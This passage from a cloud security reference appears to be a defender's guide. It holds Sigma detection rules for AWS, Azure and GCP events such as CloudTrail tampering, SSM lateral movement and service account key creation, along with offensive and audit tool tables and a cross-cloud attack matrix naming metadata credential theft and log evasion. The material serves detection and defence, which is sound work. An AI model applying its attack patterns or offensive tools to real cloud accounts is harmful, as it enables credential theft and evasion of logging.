  - Lambda functions assuming EC2 roles (unusual but possible)
  - Services proxying through non-AWS endpoints
level: high
tags:
  - attack.t1552.005
  - attack.credential_access
```

### 11.3 AWS — CloudTrail Tampering

```yaml
title: AWS CloudTrail Logging Disruption
id: c5f4e0a3-9b6d-4f2c-b7e8-0d4a3f5c6b7e
status: experimental
description: Detects attempts to disable or modify CloudTrail logging configuration
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName:
      - StopLogging
      - DeleteTrail
      - UpdateTrail
      - PutEventSelectors
      - DeleteEventDataStore
  condition: selection
falsepositives:
  - Authorized CloudTrail maintenance during compliance reviews
level: critical
tags:
  - attack.t1562.008
  - attack.defense_evasion
```

### 11.4 AWS — GuardDuty Tampering

```yaml
title: AWS GuardDuty Configuration Modification
id: d6a5f1b4-0c7e-4a3d-c8f9-1e5b4a6d7c8f
status: experimental
description: Detects modification of GuardDuty detector settings or trusted IP lists
logsource:
  product: aws
  service: cloudtrail
detection:
  selection_detector:
    eventName:
      - UpdateDetector
      - DeleteDetector
  selection_ipset:
    eventName:
      - CreateIPSet
      - UpdateIPSet
  selection_filter:
    eventName:
      - CreateFilter
  selection_publishing:
    eventName:
      - DeletePublishingDestination
  condition: selection_detector or selection_ipset or selection_filter or selection_publishing
falsepositives:
  - GuardDuty administrator performing authorized configuration changes
level: critical
tags:
  - attack.t1562.008
  - attack.defense_evasion
```

### 11.5 AWS — Lambda Persistence

```yaml
title: AWS Lambda Function Code or Configuration Modification
id: e7b6a2c5-1d8f-4b4e-d9a0-2f6c5b7e8d9a
status: experimental
description: Detects Lambda function modification that could indicate persistence or code injection
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName:
      - UpdateFunctionCode20150331v2
      - UpdateFunctionConfiguration20150331v2
      - AddLayerVersionPermission20181031
      - PublishLayerVersion20181031
  condition: selection
falsepositives:
  - CI/CD pipeline deployments
  - Authorized Lambda development activity
level: medium
tags:
  - attack.t1546
  - attack.persistence
```

### 11.6 AWS — SSM Lateral Movement

```yaml
title: AWS SSM Command Execution on EC2 Instance
id: f8c7b3d6-2e9a-4c5f-e0b1-3a7d6c8f9e0b
status: experimental
description: Detects SSM SendCommand or StartSession usage which may indicate lateral movement
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName:
      - SendCommand
      - StartSession
  filter_automation:
    userIdentity.arn|contains: 'AWSServiceRole'
  condition: selection and not filter_automation
falsepositives:
  - Authorized system administrators using Session Manager
  - Patch management automation via SSM
level: medium
tags:
  - attack.t1021
  - attack.lateral_movement
```

### 11.7 Azure — Run Command Abuse

```yaml
title: Azure VM Run Command Execution
id: a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: Detects Azure Run Command invocation which executes as SYSTEM/root on target VM
logsource:
  product: azure
  service: activitylogs
detection:
  selection:
    operationName: Microsoft.Compute/virtualMachines/runCommand/action
  condition: selection
falsepositives:
  - Authorized IT operations using Run Command for maintenance
level: high
tags:
  - attack.t1059
  - attack.execution
```

### 11.8 Azure — Managed Identity Token Request

```yaml
title: Azure Managed Identity Token Request from Unexpected Source
id: b2c3d4e5-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: experimental
description: Detects requests to the Azure Instance Metadata Service identity endpoint
logsource:
  product: azure
  service: signinlogs
detection:
  selection:
    appId|contains: 'managed-identity'
    ipAddress|cidr: '169.254.169.254/32'
  condition: selection
falsepositives:
  - Normal application usage of managed identities
level: low
tags:
  - attack.t1528
  - attack.credential_access
```

### 11.9 GCP — Service Account Key Creation

```yaml
title: GCP Service Account Key Creation
id: c3d4e5f6-7a8b-9c0d-1e2f-3a4b5c6d7e8f
status: experimental
description: Detects creation of service account keys which may indicate privilege escalation or persistence
logsource:
  product: gcp
  service: admin_activity
detection:
  selection:
    protoPayload.methodName: google.iam.admin.v1.CreateServiceAccountKey
  condition: selection
falsepositives:
  - Authorized key rotation by service account administrators
  - CI/CD pipeline service account provisioning
level: high
tags:
  - attack.t1098.001
  - attack.persistence
```

### 11.10 GCP — IAM Policy Modification

```yaml
title: GCP IAM Policy Modification
id: d4e5f6a7-8b9c-0d1e-2f3a-4b5c6d7e8f9a
status: experimental
description: Detects IAM policy changes that could indicate privilege escalation
logsource:
  product: gcp
  service: admin_activity
detection:
  selection:
    protoPayload.methodName:
      - google.iam.admin.v1.SetIAMPolicy
      - google.iam.admin.v1.UpdateRole
      - SetIamPolicy
  condition: selection
falsepositives:
  - Terraform/Deployment Manager infrastructure changes
  - Authorized IAM policy updates
level: high
tags:
  - attack.t1098
  - attack.privilege_escalation
```

---

## 12. Tooling Reference

### 12.1 Offensive Tools

| Tool | Platform | Purpose | URL |
|------|----------|---------|-----|
| **Pacu** | AWS | Exploitation framework — enumeration, privesc, persistence, exfiltration, log manipulation | https://github.com/RhinoSecurityLabs/pacu |
| **PowerZure** | Azure | Entra ID/Azure exploitation — role analysis, token gen, resource targeting | https://github.com/hausec/PowerZure |
| **ROADtools** | Azure AD | AD enumeration, offline analysis, token manipulation (PRT abuse) | https://github.com/dirkjanm/ROADtools |
| **GCPBucketBrute** | GCP | Bucket enumeration, permission testing, privesc detection | https://github.com/RhinoSecurityLabs/GCPBucketBrute |
| **SneakyEndpoints** | AWS | Terraform-automated VPC endpoint setup for credential laundering | — |
| **EC2StepShell** | AWS | Interactive shell via SSM command execution | — |
| **CredMaster** | Azure | Email/credential enumeration | https://github.com/knavesec/CredMaster |
| **Quiet Riot** | Azure | Azure email enumeration | https://github.com/righteousgambit/quiet-riot |
| **AzureHound** | Azure | BloodHound data collection for Azure attack paths | — |
| **CLIer** | AWS | Browser extension for console credential extraction | https://github.com/AI-redteam/clier |

### 12.2 Defensive / Audit Tools

| Tool | Platform | Purpose | URL |
|------|----------|---------|-----|
| **Prowler** | AWS/Azure/GCP/K8s | Security posture assessment — 572 AWS, 165 Azure, 100 GCP checks | https://github.com/prowler-cloud/prowler |
| **ScoutSuite** | AWS/Azure/GCP/Ali/OCI | Multi-cloud security auditing — offline HTML reports | https://github.com/nccgroup/ScoutSuite |
| **MicroBurst** | Azure | Azure security testing — storage enumeration, VM analysis | https://github.com/NetSPI/MicroBurst |
| **aws-lint-iam-policies** | AWS | IAM policy analysis for misconfigurations | — |
| **domain-protect** | AWS | Detect orphaned CloudFront/DNS subdomain takeover | OWASP |

### 12.3 Quick Reference: Prowler Usage

```bash
# Install
pip install prowler

# Run all checks for a provider
prowler aws
prowler azure
prowler gcp

# List available checks
prowler aws --list-checks

# Run specific compliance framework
prowler aws --compliance cis_3.0_aws

# Launch dashboard
prowler dashboard
```

### 12.4 Quick Reference: ScoutSuite Usage

```bash
# AWS assessment
scout aws

# Azure assessment
scout azure --cli

# GCP assessment
scout gcp --service-account /path/to/sa-key.json

# Output: HTML report with findings and risk levels
```

---

## Appendix: Cross-Cloud Attack Pattern Matrix

| Attack Pattern | AWS | Azure | GCP |
|---------------|-----|-------|-----|
| **Metadata credential theft** | IMDS 169.254.169.254 | IMDS 169.254.169.254 | metadata.google.internal |
| **IAM privesc via policy** | 40+ paths (PassRole, policy mod) | RBAC role assignment | 23+ paths (SA impersonation) |
| **Storage misconfiguration** | S3 public buckets/ACLs | Anonymous blob access | Public GCS buckets |
| **Serverless persistence** | Lambda runtime backdoor | Function App identity | Cloud Function SA abuse |
| **Compute lateral movement** | SSM SendCommand | Run Command (SYSTEM/root) | OS Login / SSH keys |
| **Log evasion** | CloudTrail manipulation | Activity Log gaps | Audit Log disabled data events |
| **Detection service bypass** | GuardDuty config modification | Defender suppression | SCC finding muting |
| **Network isolation bypass** | Connection tracking | NSG stateful bypass | Firewall rule gaps |
| **Identity provider abuse** | OIDC IdP, Roles Anywhere | Entra ID, PRT theft | Workload Identity Federation |
| **DNS/CDN takeover** | CloudFront + deleted S3 | Traffic Manager orphan | Cloud CDN + deleted GCS |

---

*Sources: hackingthe.cloud (Nick Frichette et al.), Rhino Security Labs, NCC Group, BishopFox, MITRE ATT&CK Cloud Matrix*
